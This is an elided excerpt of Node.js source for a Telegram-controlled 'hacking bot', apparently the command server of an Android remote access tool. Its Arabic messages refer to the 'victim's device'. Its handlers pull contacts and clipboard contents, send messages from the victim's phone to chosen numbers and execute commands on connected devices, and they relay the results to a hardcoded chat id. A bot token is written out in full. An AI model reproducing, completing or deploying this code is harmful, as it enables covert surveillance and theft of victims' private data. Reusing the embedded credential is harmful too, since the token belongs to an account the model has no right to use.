...
const token = '7325712097:AAHP9T4xAmbYKtN5z4zheQMzyEc-MPZLbzQ'
const id = '6105312973'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت المطور ◥ ツقاهر 🥷الاوغاد ツ ◤ 
})
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية الئ الرقم الذي كتبتة قبل قليل....')) {
            ...
            appBot.sendMessage(id,
                ...
                '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ◥ ツقاهر 🥷الاوغاد ツ ◤ ،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت ◥ ツقاهر 🥷الاوغاد ツ ◤\n\n' +
...
appBot.on("callback_query", (callbackQuery) => {
    ...
    if (commend == 'contacts') {
        ...
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ميدو ◥ ツقاهر 🥷الاوغاد ツ ◤،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
    ...
    if (commend == 'clipboard') {
        ...
        appBot.sendMessage(id,
            '°• طلبك قيد المعالجة الرجاء الانتظار........\n\n' +
            '• ستتلقى ردًا في اللحظات القليلة القادمة المطور ميدو مشاكل ◥ ツقاهر 🥷الاوغاد ツ ◤،',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الاجهزة المتصلة"], ["تنفيذ الامر"]],
